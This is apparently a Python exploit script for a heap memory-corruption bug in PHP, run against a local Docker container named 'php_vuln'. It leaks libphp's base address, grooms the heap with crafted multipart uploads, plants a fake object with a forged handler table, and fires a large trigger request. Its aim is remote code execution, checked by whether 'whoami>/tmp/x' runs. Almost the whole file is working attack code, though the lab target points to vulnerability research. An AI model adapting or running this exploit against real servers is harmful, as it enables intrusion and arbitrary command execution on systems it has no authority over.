#!/usr/bin/env python3
"""oom103: aim-tile plant + FAT STOCK trigger (the 98g-proven rhythm).

Decisive delta found: 98g's crash (rdi=OBJ bit-for-bit) came from a
FIRE with the fat 9.2MB stock envelope; tonight's 99-102 fires used
5.6MB aim bodies -> walk phase never reaches the planted region ->
silence. LAW: plant with the aim tile, TRIGGER with the fat envelope.
One plant+fire per worker boot (fat fire crash -> Apache respawns ->
ASLR rebases -> re-probe before next attempt).
"""
import struct, subprocess, time, re, urllib.request, urllib.error
import payload68

HOST = "http://127.0.0.1:8081"
OUT = lambda s: print(s, flush=True)

def sh(cmd, timeout=90):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          timeout=timeout).stdout.strip()

def get(url, timeout=30):
    try:
        return urllib.request.urlopen(url, timeout=timeout).read().decode("utf8", "replace")
    except Exception as e:
        return "ERR %s" % e

def post(url, body, ctype=None, timeout=120):
    req = urllib.request.Request(HOST + url, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return str(r.status), r.read(120)
    except urllib.error.HTTPError as e:
        return str(e.code), e.read(120)
    except Exception as e:
        return "ERR", repr(e).encode()

def sapi(body):
    return post("/oom_sapi.php", body)

def fat_trigger(stamp):
    body = payload68.build_attack(3400, stamp)
    return post("/oom_mod.php", body,
                ctype="multipart/form-data; boundary=BOUND")

BASE = None
for ln in sh("docker exec php_vuln sh -c 'cat /proc/1/maps'").splitlines():
    if "libphp.so" in ln:
        BASE = int(ln.split("-")[0], 16)
        break
OUT("    libphp=0x%x" % BASE)
assert BASE and BASE > 0x7f0000000000

ZIF = 0x39b8a0
TILE = 176
MARKER = b"ZAIMZAIM" * 24

def gs_block():
    hdr = struct.pack("<IIQQ", 1, 0x106, 0, 13)
    s = b"whoami>/tmp/x\x00"
    return hdr + s + b"\x00" * ((-(24 + len(s))) % 8)   # 40B

def build_tile(OBJ, BOFF):
    B = bytearray(TILE)
    struct.pack_into("<II", B, 0x00, 1, 0x108)
    struct.pack_into("<II", B, 0x08, 1, 0)
    struct.pack_into("<Q",  B, 0x10, 0)
    struct.pack_into("<I",  B, 0x2C, 1)           # num_args (frame+44)
    B[0x18:0x20] = struct.pack("<Q", OBJ + 0x90)  # handlers -> table
    B[0x50:0x58] = struct.pack("<Q", OBJ + 0x68)  # arg zval = gs
    B[0x58:0x5C] = struct.pack("<I", 6)           # IS_STRING
    B[0x68:0x68 + 40] = gs_block()
    B[0x90:0xA0] = struct.pack("<QQ", 0, BASE + ZIF)
    T = bytearray(1537)
    for off in range(0, BOFF, 8):
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = B
    MOFF = BOFF + TILE
    if MOFF + 192 <= 1537:
        T[MOFF:MOFF + 192] = MARKER
    return bytes(T)

def probe_small(needle):
    h = needle.hex()
    for a in range(6):
        out = get("%s?h=%s&chunk=262144&maxc=6" % (HOST + "/oom_probe.php", h), timeout=40)
        if out.startswith("ERR") or "Fatal" in out:
            time.sleep(0.5); continue
        m = re.search(r"R=(\d+) d=([0-9a-f ]+)", out)
        if m:
            offs = [int(x, 16) for x in m.group(2).split()]
            if offs:
                return offs
    return None

def aim_body(tile):
    parts = []
    parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p0\"; filename=\"%s\"\r\n"
                 b"Content-Type: text/plain\r\n\r\n%s\r\n" % (b"a" * 1525, tile))
    for i in range(1, 3400):
        parts.append(b"------X\r\nContent-Disposition: form-data; name=\"p%d\"; filename=\"%s\"\r\n"
                     b"Content-Type: text/plain\r\n\r\n%s\r\n" % (i, b"a" * 1525, b"A" * 1537))
    parts.append(b"------X--\r\n")
    return b"".join(parts)

def check_x(tag):
    x = sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'")
    if "No such" not in x:
        OUT("    *** %s: /tmp/x EXISTS: %r" % (tag, x))
        return True
    return False

def warm_and_measure():
    for i in range(30):
        sapi(aim_body((b"WARMUPX" * 192 + b"W" * 400)[:1537]))
    offs = probe_small(b"WARMUPX" * 24)
    if not offs:
        return None, None
    V = offs[0]
    OBJ = None
    for b in range(380, 900):
        cand = V + b
        if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1:
            OBJ = cand; BOFF = b
            break
    return V, (OBJ, BOFF) if OBJ else None

# ================= cycles =================
stamp = 6000000
for cyc in range(4):
    OUT("-- cycle %d --" % cyc)
    V, aim = warm_and_measure()
    OUT("    V=%s aim=%s" % (hex(V) if V else None, aim))
    if not aim:
        continue
    OBJ, BOFF = aim
    tile = build_tile(OBJ, BOFF)
    code, resp = sapi(aim_body(tile))          # PLANT
    OUT("    plant: %s %r" % (code, resp[:40]))
    if check_x("plant"):
        raise SystemExit("*** RCE CONFIRMED (plant) ***")
    stamp += 1000
    code, resp = fat_trigger(stamp)            # TRIGGER (fat envelope)
    OUT("    trigger: %s %r" % (code, resp[:40]))
    if check_x("trigger"):
        raise SystemExit("*** RCE CONFIRMED ***")
    if code == "ERR":
        OUT("    (worker likely crashed -> fresh boot next cycle)")
        time.sleep(3)
OUT("done; /tmp/x=%s" % sh("docker exec php_vuln sh -c 'cat /tmp/x 2>&1'"))
